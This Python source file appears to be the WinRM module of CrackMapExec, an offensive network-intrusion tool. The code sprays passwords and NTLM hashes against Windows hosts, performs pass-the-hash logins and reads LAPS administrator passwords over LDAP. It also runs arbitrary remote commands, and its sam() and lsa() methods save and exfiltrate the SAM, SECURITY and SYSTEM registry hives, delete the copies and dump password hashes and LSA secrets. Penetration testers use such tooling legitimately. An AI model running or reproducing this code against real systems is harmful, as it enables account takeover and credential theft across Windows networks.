#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import logging
import configparser
from impacket.smbconnection import SMBConnection, SessionError
from cme.connection import *
from cme.helpers.logger import highlight
from cme.helpers.bloodhound import add_user_bh
from cme.protocols.ldap.smbldap import LDAPConnect
from cme.logger import CMEAdapter
from io import StringIO
from pypsrp.client import Client
from impacket.examples.secretsdump import LocalOperations, LSASecrets

# The following disables the InsecureRequests warning and the 'Starting new HTTPS connection' log message
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class SuppressFilter(logging.Filter):
    # remove warning https://github.com/diyan/pywinrm/issues/269
    def filter(self, record):
        return 'wsman' not in record.getMessage()

class winrm(connection):

    def __init__(self, args, db, host):
        self.domain = None
        self.server_os = None
        self.output_filename = None

        connection.__init__(self, args, db, host)

    @staticmethod
    def proto_args(parser, std_parser, module_parser):
        winrm_parser = parser.add_parser('winrm', help="own stuff using WINRM", parents=[std_parser, module_parser])
        winrm_parser.add_argument("-H", '--hash', metavar="HASH", dest='hash', nargs='+', default=[], help='NTLM hash(es) or file(s) containing NTLM hashes')
        winrm_parser.add_argument("--no-bruteforce", action='store_true', help='No spray when using file for username and password (user1 => password1, user2 => password2')
        winrm_parser.add_argument("--continue-on-success", action='store_true', help="continues authentication attempts even after successes")
        winrm_parser.add_argument("--port", type=int, default=0, help="Custom WinRM port")
        winrm_parser.add_argument("--ssl", action='store_true', help="Connect to SSL Enabled WINRM")
        winrm_parser.add_argument("--ignore-ssl-cert", action='store_true', help="Ignore Certificate Verification")
        winrm_parser.add_argument("--laps", dest='laps', metavar="LAPS", type=str, help="LAPS authentification", nargs='?', const='administrator')
        dgroup = winrm_parser.add_mutually_exclusive_group()
        dgroup.add_argument("-d", metavar="DOMAIN", dest='domain', type=str, default=None, help="domain to authenticate to")
        dgroup.add_argument("--local-auth", action='store_true', help='authenticate locally to each target')

        cgroup = winrm_parser.add_argument_group("Credential Gathering", "Options for gathering credentials")
        cegroup = cgroup.add_mutually_exclusive_group()
        cegroup.add_argument("--sam", action='store_true', help='dump SAM hashes from target systems')
        cegroup.add_argument("--lsa", action='store_true', help='dump LSA secrets from target systems')

        cgroup = winrm_parser.add_argument_group("Command Execution", "Options for executing commands")
        cgroup.add_argument('--no-output', action='store_true', help='do not retrieve command output')
        cgroup.add_argument("-x", metavar="COMMAND", dest='execute', help="execute the specified command")
        cgroup.add_argument("-X", metavar="PS_COMMAND", dest='ps_execute', help='execute the specified PowerShell command')

        return parser

    def proto_flow(self):
        self.proto_logger()
        if self.create_conn_obj():
            self.enum_host_info()
            if self.print_host_info():
                if self.login():
                    if hasattr(self.args, 'module') and self.args.module:
                        self.call_modules()
                    else:
                        self.call_cmd_args()

    def proto_logger(self):
        self.logger = CMEAdapter(extra={'protocol': 'SMB',
                                        'host': self.host,
                                        'port': 'NONE',
                                        'hostname': 'NONE'})

    def enum_host_info(self):
        # smb no open, specify the domain
        if self.args.domain:
            self.domain = self.args.domain
            self.logger.extra['hostname'] = self.hostname
        else:
            try:
                smb_conn = SMBConnection(self.host, self.host, None)
                try:
                    smb_conn.login('', '')
                except SessionError as e:
                    pass

                self.domain = smb_conn.getServerDNSDomainName()
                self.hostname = smb_conn.getServerName()
                self.server_os = smb_conn.getServerOS()
                self.logger.extra['hostname'] = self.hostname

                self.output_filename = os.path.expanduser('~/.cme/logs/{}_{}_{}'.format(self.hostname, self.host, datetime.now().strftime("%Y-%m-%d_%H%M%S")))

                try:
                    smb_conn.logoff()
                except:
                    pass

            except Exception as e:
                logging.debug("Error retrieving host domain: {} specify one manually with the '-d' flag".format(e))

            if self.args.domain:
                self.domain = self.args.domain

            if self.args.local_auth:
                self.domain = self.hostname

    def laps_search(self, username, password, ntlm_hash, domain):
        ldapco = LDAPConnect(self.domain, "389", self.domain)
        connection = ldapco.plaintext_login(domain, username[0] if username else '', password[0] if password else '', ntlm_hash[0] if ntlm_hash else '' )
        if connection == False:
            logging.debug('LAPS connection failed with account {}'.format(username))
            return False
        searchFilter = '(&(objectCategory=computer)(ms-MCS-AdmPwd=*)(name='+ self.hostname +'))'
        attributes = ['ms-MCS-AdmPwd','samAccountname']
        result = connection.search(searchFilter=searchFilter,
                                                attributes=attributes,
                                                sizeLimit=0)

        msMCSAdmPwd = ''
        sAMAccountName = ''
        for item in result:
            if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
                continue
            for computer in item['attributes']:
                if str(computer['type']) == "sAMAccountName":
                    sAMAccountName = str(computer['vals'][0])
                else:
                    msMCSAdmPwd = str(computer['vals'][0])
            logging.debug("Computer: {:<20} Password: {} {}".format(sAMAccountName, msMCSAdmPwd, self.hostname))
        self.username = self.args.laps
        self.password = msMCSAdmPwd
        if msMCSAdmPwd == '':
            logging.debug('msMCSAdmPwd is empty, account cannot read LAPS property for {}'.format(self.hostname))
            return False
        if ntlm_hash:
            hash_ntlm = hashlib.new('md4', msMCSAdmPwd.encode('utf-16le')).digest()
            self.hash = binascii.hexlify(hash_ntlm).decode()
        self.domain = self.hostname
        return True

    def print_host_info(self):
        if self.args.domain:
            self.logger.extra['protocol'] = "HTTP"
            self.logger.info(self.endpoint)
        else:
            self.logger.extra['protocol'] = "SMB"
            self.logger.info(u"{} (name:{}) (domain:{})".format(self.server_os,
                                                                    self.hostname,
                                                                    self.domain))
            self.logger.extra['protocol'] = "HTTP"
            self.logger.info(self.endpoint)
        self.logger.extra['protocol'] = "WINRM"
        if self.args.laps:
            return self.laps_search(self.args.username, self.args.password, self.args.hash, self.domain)
        return True
        

    def create_conn_obj(self):

        endpoints = [
            'https://{}:{}/wsman'.format(self.host, self.args.port if self.args.port else 5986),
            'http://{}:{}/wsman'.format(self.host, self.args.port if self.args.port else 5985)
        ]

        for url in endpoints:
            try:
                requests.get(url, verify=False, timeout=3)
                self.endpoint = url
                if self.endpoint.startswith('https://'):
                    self.port = self.args.port if self.args.port else 5986
                else:
                    self.port = self.args.port if self.args.port else 5985

                self.logger.extra['port'] = self.port

                return True
            except Exception as e:
                if 'Max retries exceeded with url' not in str(e):
                    logging.debug('Error in WinRM create_conn_obj:' + str(e))

        return False

    def plaintext_login(self, domain, username, password):
        try:
            from urllib3.connectionpool import log
            log.addFilter(SuppressFilter())
            if not self.args.laps:
                self.password = password
                self.username = username
            self.domain = domain
            if self.args.ssl and self.args.ignore_ssl_cert:
                self.conn = Client(self.host,
                                        auth='ntlm',
                                        username=u'{}\\{}'.format(domain, self.username),
                                        password=self.password,
                                        ssl=True,
                                        cert_validation=False)
            elif self.args.ssl:
                self.conn = Client(self.host,
                                        auth='ntlm',
                                        username=u'{}\\{}'.format(domain, self.username),
                                        password=self.password,
                                        ssl=True)
            else:
                self.conn = Client(self.host,
                                        auth='ntlm',
                                        username=u'{}\\{}'.format(domain, self.username),
                                        password=self.password,
                                        ssl=False)

            # TO DO: right now we're just running the hostname command to make the winrm library auth to the server
            # we could just authenticate without running a command :) (probably)
            self.conn.execute_ps("hostname")
            self.admin_privs = True
            self.logger.success(u'{}\\{}:{} {}'.format(self.domain,
                                                       self.username,
                                                       self.password if not self.config.get('CME', 'audit_mode') else self.config.get('CME', 'audit_mode')*8,
                                                       highlight('({})'.format(self.config.get('CME', 'pwn3d_label')) if self.admin_privs else '')))
            if not self.args.local_auth:
                add_user_bh(self.username, self.domain, self.logger, self.config) 
            if not self.args.continue_on_success:
                return True

        except Exception as e:
            if "with ntlm" in str(e): 
                self.logger.error(u'{}\\{}:{}'.format(self.domain,
                                                        self.username,
                                                        self.password if not self.config.get('CME', 'audit_mode') else self.config.get('CME', 'audit_mode')*8))
            else:
                self.logger.error(u'{}\\{}:{} "{}"'.format(self.domain,
                                                        self.username,
                                                        self.password if not self.config.get('CME', 'audit_mode') else self.config.get('CME', 'audit_mode')*8,
                                                        e))

            return False

    def hash_login(self, domain, username, ntlm_hash):
        try:
            from urllib3.connectionpool import log
            log.addFilter(SuppressFilter())
            lmhash = '00000000000000000000000000000000:'
            nthash = ''

            if not self.args.laps:
                self.username = username
                #This checks to see if we didn't provide the LM Hash
                if ntlm_hash.find(':') != -1:
                    lmhash, nthash = ntlm_hash.split(':')
                else:
                    nthash = ntlm_hash
                    ntlm_hash = lmhash + nthash
                if lmhash: self.lmhash = lmhash
                if nthash: self.nthash = nthash
            else:
                nthash = self.hash
            
            self.domain = domain
            if self.args.ssl and self.args.ignore_ssl_cert:
                self.conn = Client(self.host,
                                        auth='ntlm',
                                        username=u'{}\\{}'.format(self.domain, self.username),
                                        password=lmhash + nthash,
                                        ssl=True,
                                        cert_validation=False)
            elif self.args.ssl:
                self.conn = Client(self.host,
                                        auth='ntlm',
                                        username=u'{}\\{}'.format(self.domain, self.username),
                                        password=lmhash + nthash,
                                        ssl=True)
            else:
                self.conn = Client(self.host,
                                        auth='ntlm',
                                        username=u'{}\\{}'.format(self.domain, self.username),
                                        password=lmhash + nthash,
                                        ssl=False)

            # TO DO: right now we're just running the hostname command to make the winrm library auth to the server
            # we could just authenticate without running a command :) (probably)
            self.conn.execute_ps("hostname")
            self.admin_privs = True
            self.logger.success(u'{}\\{}:{} {}'.format(self.domain,
                                                       self.username,
                                                       nthash if not self.config.get('CME', 'audit_mode') else self.config.get('CME', 'audit_mode')*8,
                                                       highlight('({})'.format(self.config.get('CME', 'pwn3d_label')) if self.admin_privs else '')))
            if not self.args.local_auth:
                add_user_bh(self.username, self.domain, self.logger, self.config)
            if not self.args.continue_on_success:
                return True

        except Exception as e:
            if "with ntlm" in str(e): 
                self.logger.error(u'{}\\{}:{}'.format(self.domain,
                                                        self.username,
                                                        nthash if not self.config.get('CME', 'audit_mode') else self.config.get('CME', 'audit_mode')*8))
            else:
                self.logger.error(u'{}\\{}:{} "{}"'.format(self.domain,
                                                        self.username,
                                                        nthash if not self.config.get('CME', 'audit_mode') else self.config.get('CME', 'audit_mode')*8,
                                                        e))

            return False

    def execute(self, payload=None, get_output=False):
        try:
            r = self.conn.execute_cmd(self.args.execute)
        except:
            self.logger.debug('Cannot execute cmd command, probably because user is not local admin, but powershell command should be ok !')
            r = self.conn.execute_ps(self.args.execute)
        self.logger.success('Executed command')
        self.logger.highlight(r[0])

    def ps_execute(self, payload=None, get_output=False):
        r = self.conn.execute_ps(self.args.ps_execute)
        self.logger.success('Executed command')
        self.logger.highlight(r[0])

    def sam(self):
        self.conn.execute_cmd("reg save HKLM\SAM C:\\windows\\temp\\SAM && reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM")
     
        self.conn.fetch("C:\\windows\\temp\\SAM", self.output_filename + ".sam")
        self.conn.fetch("C:\\windows\\temp\\SYSTEM", self.output_filename + ".system")
        
        self.conn.execute_cmd("del C:\\windows\\temp\\SAM && del C:\\windows\\temp\\SYSTEM")

        localOperations = LocalOperations(self.output_filename + ".system")
        bootKey = localOperations.getBootKey()
        SAM = SAMHashes(self.output_filename + ".sam", bootKey, isRemote=None, perSecretCallback=lambda secret: self.logger.highlight(secret))
        SAM.dump()
        SAM.export(self.output_filename + ".sam")

    def lsa(self):
        self.conn.execute_cmd("reg save HKLM\SECURITY C:\\windows\\temp\\SECURITY && reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM")
        self.conn.fetch("C:\\windows\\temp\\SECURITY", self.output_filename + ".security")
        self.conn.fetch("C:\\windows\\temp\\SYSTEM", self.output_filename + ".system")
        self.conn.execute_cmd("del C:\\windows\\temp\\SYSTEM && del C:\\windows\\temp\\SECURITY")

        localOperations = LocalOperations(self.output_filename + ".system")
        bootKey = localOperations.getBootKey()
        LSA = LSASecrets(self.output_filename + ".security", bootKey, None, isRemote=None, perSecretCallback=lambda secretType, secret: self.logger.highlight(secret))
        LSA.dumpCachedHashes()
        LSA.dumpSecrets()
